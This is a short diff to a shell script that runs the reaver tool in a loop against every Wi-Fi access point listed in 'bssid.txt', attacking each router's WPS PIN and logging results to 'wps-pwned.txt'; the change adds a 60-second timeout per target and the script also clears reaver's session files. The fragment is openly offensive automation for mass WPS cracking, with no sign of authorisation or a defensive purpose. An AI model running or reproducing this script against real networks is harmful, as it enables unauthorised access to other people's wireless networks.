@@ -42,7 +42,7 @@ echo -e ${col} "Running reaver" ${nc}
 
  sudo rm /var/lib/reaver/*
  while IFS= read -r line; do
-     sudo reaver -q -i wlan1 -b "$line" >> wps-pwned.txt
+     sudo timeout 60s reaver -q -i wlan1 -b "$line" >> wps-pwned.txt
  done < bssid.txt
 
  cp wps-pwned.txt ~/hs/wps-pwned_`date +"%H:%M:%S:%d-%b-%Y"`.txt
